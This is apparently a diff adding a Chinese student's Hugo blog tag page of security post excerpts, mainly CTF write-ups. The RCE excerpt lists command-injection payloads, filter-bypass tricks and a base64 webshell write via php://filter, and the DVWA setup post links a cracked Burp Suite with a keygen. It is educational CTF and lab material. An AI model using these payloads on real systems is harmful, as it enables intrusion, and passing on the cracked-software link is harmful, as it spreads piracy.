+import requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests....</p>
+</section>
+<footer class=entry-footer>
+October 21, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to CNSS Recruit-Web Write UP" href=https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+RCE 远程命令执行漏洞
+</h2>
+</header>
+<section class=entry-content>
+<p>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
+Web 29 过滤了flag字样
+?c=system("cat f*");
+Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
+echo `cat f\lag.ph\p`; 反引号可以执行系统命令
+Web 31 在cat被禁时，我们还可以采用如下命令
+1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
+空格的代替符号：
+1.${IFS}
+2.$IFS$1
+3.${IFS
+4.%20
+5.&lt;和&lt;>重定向符
+6.%09
+构造本题payload
+?c=echo'more%09f*'; 其他题解：
+?c=eval($_GET[1]);&1=system('cat flag.php');嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");等价于system()。这个学到了！ Web 32 屏蔽了echo
+分号可以用?>代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
+?c=include"$_GET[1]"?>&1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &lt;?php $filename=$_GET['filename']; $content=$_GET['content']; file_put_contents($filename,"&lt;?php exit();".$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
+我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
+base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
+?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !...</p>
+</section>
+<footer class=entry-footer>
+October 20, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to RCE 远程命令执行漏洞" href=https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+MoeCTF 2021 西电新生赛WP
+</h2>
+</header>
+<section class=entry-content>
+<p>前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。
+想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。
+1. Web安全入门指北-GET &lt;?php include "flag.php"; $moe = $_GET['moe']; if ($moe == "flag") { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。
+在地址栏中发送get请求：
+http://47.93.215.154:10000/?moe=flag
+得到flag：
+moectf{We1c0me_t0_CTF_Web!}
+2. Web安全入门指北-POST &lt;?php include "flag.php"; $moe = $_POST['moe']; if ($moe == "flag") { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。
+用hackbar：
+在post参数里填入moe=flag
+Execute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}
+3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:
+You are not VIP,I will give flag to VIP!
+可以大致猜测要伪造某些访问项目，将非VIP改为VIP。
+用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。
+将抓包结果发送到重发器，将VIP值改为1，点击发送。
+得到flag。
+4. 2048 打开环境，发现是一个2048小游戏...</p>
+</section>
+<footer class=entry-footer>
+August 19, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to MoeCTF 2021 西电新生赛WP" href=https://shenyimings.github.io/post/12.moectf-web-write-up/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+DVWA环境搭建 + BurpSuite2.1安装 + Chrome配置
+</h2>
+</header>
+<section class=entry-content>
+<p>[TOC]
+DVWA环境搭建 DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。
+DVWA运行基于LAMP（Linux+Apache+MySQL+PHP），出于时间和个人能力的考虑，很难成功地从0开始搭建这样一套体系，故而使用小皮的PHPStudy环境。
+PHPStudy：https://www.xp.cn/
+DVWA：http://www.dvwa.co.uk/
+一、安装PHP Study 二、配置DVWA 将下载的DVWA压缩包解压到PHP Study的WWW目录下并解压，进入目录中的config文件夹，编辑config.inc.php文件，找到_DVWA['db_password']='root'行，将user改为‘root’；password改为‘root’。
+三、配置PHP Study 开启Apache和PHP服务，点击左边栏网站，左上角创建网站，域名为设置为本机本地域名，查看本地域名方法：进入powershell输入命令ipconfig查看，我电脑本机域名为192.168.0.104
+为什么不设置为localhost 127.0.0.1：Burp Suite配合chrome浏览器抓包时可能无法拦截localhost的数据。
+根目录指向刚刚解压的DVWA-master目录下，点击确认，网站创建成功。
+四、浏览器进入192.108.0.104 点击Create/Reset Database创建数据库
+用户名：admin 默认密码：password
+登陆进入后即部署成功。
+BurpSuite2.1安装 BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。
+1. JDK及BurpSuite破解版下载 链接：https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w 提取码：w5lg
+2. 配置JAVA环境 安装好jdk后，右键计算机-属性-系统设置-高级-环境变量
+新增两个环境变量
+%JAVA_HOME%=jdk安装文件夹所在位置，如...\jdk1.8.0_201
+%CLASSPATH%=.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar
+修改path变量，分别添加jdk和jre安装文件夹下的bin目录。
+3. 激活BurpSuite jdk配置完毕后，先打开burp-loader-keygen.jar文件
+点击run
+将license许可证复制入弹出的框中，点击Next，选择Manual activation手动激活。
+将生成的申请码粘贴入注册机中，自动算号，将生成的激活码复制入框中，点击Next即激活成功。
+此后想打开Burp Suite，双击运行目录下的VBS脚本即可。
+BurpSuite Chrome配置 1. 设置流量代理Proxy ​ 在谷歌应用商店中安装Falcon Proxy，添加一个新的代理127....</p>
+</section>
+<footer class=entry-footer>
+August 5, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to DVWA环境搭建 + BurpSuite2.1安装 + Chrome配置" href=https://shenyimings.github.io/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+burpsuite2.1%E5%AE%89%E8%A3%85/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+MISC类型题目及技巧
+</h2>
+</header>
+<section class=entry-content>
+<p>图片隐写 图片EXIF信息 GIF图片 文件头 16进制编码 编码 Readflag
+社工 Bugku社工_进阶收集
+根据题目给出的说说截图，有如下信息：
+终点位置突出特征：有塔 坐地铁需要7站，中间还要转一站
+出发站为始发站 家位置在始发站和第二站的中间位置 根据以上信息，先对说说配图进行百度识图，查找到地理位置为西安大雁塔，对照西安地铁图，距离大雁塔站有7站且为始发站的站点只有韦曲南站，至此即可确定小美所住的小区在韦曲南站和航天城站之间，利用百度地图标尺画两个圆，可以大致确定符合条件的7家小区，挨个尝试可得flag。
+Bugku_隐写)
+题目文件为一张PNG格式图片，Windows自带图片浏览器无法正常打开该图片，说明图片内容经过人为篡改。使用工具TweakPng查看png内容，将图片大小的chunk部分高度修改为宽度一致，500px，保存，图片flag得以正常显示。
+正常做法：用Python脚本计算和图片大小相匹配的正常宽高，再利用Tweakpng查看并修改。
+</p>
+</section>
+<footer class=entry-footer>
+July 23, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to MISC类型题目及技巧" href=https://shenyimings.github.io/post/6.bugku_misc/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+CTF比赛方向选择
+</h2>
+</header>
+<section class=entry-content>
+<p>了解CTF CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON。CTF比赛有以下突出特点：
+比赛侧重于对计算机底层和系统安全的核心能力，Web 漏洞攻防技巧完全被忽略。 竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。 采用「零和」计分规则。 团队综合能力考验：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运行维护以及安全方面的编程调试。 CTF竞赛内容 常见六个分类
+Web - 网络攻防
+考察Web安全中的常见漏洞，如SQL注入、XSS、CSRF、文件包含、文件上传、代码审计。Web安全题型最为常见。
+RE - 逆向工程
+反编译、软件保护、反调试、软件加壳脱壳。
+PWN - 二进制漏洞
+与计算机操作系统底层相关，主要出现在Linux平台上。
+Crypto - 密码学
+古典密码与现代密码学安全两方面
+Mobile - 移动安全
+安卓逆向相关
+MISC - 安全杂项
+信息搜集（社工）、编码分析、取证分析、隐写分析等
+比赛学习方向选择 基于我个人对于六个分类的了解，我选择Web方向与Crypto方向。
+Web
+作为一个尝试过Minecraft自建服务器、外网vps搭梯子（学习用）、购置域名建WordPress小站、提取视频网站M3U8下载地址的ctf beginner，Web方向是我最为感兴趣和想学习的方向，也是我认为最有应用性和最能获得成就感的方向。Web方向知识面的广度很宽，涉及范围相当大，故而学习需要恒心。
+Crypto
+选择这个方向的原因很简单，我是目前所读专业即为信息安全（密码学方向） 故而此方向与学科所学相关，虽难但也必须披荆斩棘，筚路蓝缕。
+次要方向：PWN...</p>
+</section>
+<footer class=entry-footer>
+July 21, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to CTF比赛方向选择" href=https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+Ubuntu 18.04 LTS的配置与入门
+</h2>
+</header>
+<section class=entry-content>
+<p>系统选择 Linux有多种发行版，作为一名小白，我选择Ubuntu的原因是以前用过并且感觉桌面界面十分讨喜，再者，Ubuntu作为常见的个人桌面操作系统，使用人数相对较多，教程也更多，对萌新十分友善。
+载体 最标准的方式当然是重装系统咯，总是佩服小时候爱捣鼓的自己，想格盘就格盘，说重装就重装了，长大以后，不知是懒了还是如何，很难再去断舍离了，只能继续看着又快满的C盘抱残守旧了，单系统不可取，双系统也要重新给硬盘分区，过于麻烦，那就传统的VMware虚拟机吧，在去Ubuntu官网下载镜像时，发现了一个全新的选择：Windows WSL，即Windows Subsystem for Linux，籍此可以直接在Windows 10上运行Ubuntu，安装便捷，启动快速，就决定是你了！
+系统配置（学习网址：CSDN博客） 安装好后首先设置root用户, 更换apt数据源 sudo passwd root su root cd /etc/apt cp sources.list sources.list.bak #备份配置文件 vim sources.list #编辑配置文件 将配置文件内容更改为阿里云镜像源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors....</p>
+</section>
+<footer class=entry-footer>
+July 20, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to Ubuntu 18.04 LTS的配置与入门" href=https://shenyimings.github.io/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+学习Markdown语法
+</h2>
+</header>
+<section class=entry-content>
+<p>2021年7月18日 了解Markdown Markdown是一种轻量级标记语言，属于HTML格式的一种，易读易写易更改，处处透着极简主义的影子。在GitHub等网站上使用极广，更可以跨平台使用。
+Windows桌面端软件选择 Web网页版有简书等知名博客网站可作记录，千挑万选后我选择了Typora。优点如下：
+有中文版。这一点可能不足为道，因为菜单的语言并不影响我们的使用，然而，不支持中文意味着软件对中文输入法的适配甚至中文文本的显示都极为差劲，这一点是我由MarkdownPad的使用中发现的。 Typora支持即时渲染技术，非常方便新人学习熟练。 Typora可以将md文件导出为pdf格式作发布用，对于笔记爱好者来说成就感满满。 Markdown语法 区块引用
+代码引用：
+printf("使用反引号包裹代码")
+int main() { int a; scanf("%d",&a); printf("%d",a++); return 0; } emoji: :smile:
+公式： $$ lim_{x \to\infty} \exp(-x) = 0 $$ 插入图片：</p>
+</section>
+<footer class=entry-footer>
+July 19, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to 学习Markdown语法" href=https://shenyimings.github.io/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/></a>
+</article>
+</main><footer class=footer>
+<span>&copy; 2022 <a href=https://shenyimings.github.io/>Console.makeHappy(_1ming)</a></span>
+<span>&#183;</span>
+<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
+<span>&#183;</span>
+<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
+<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</button>
+</a>
+<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
 </body>
 </html>
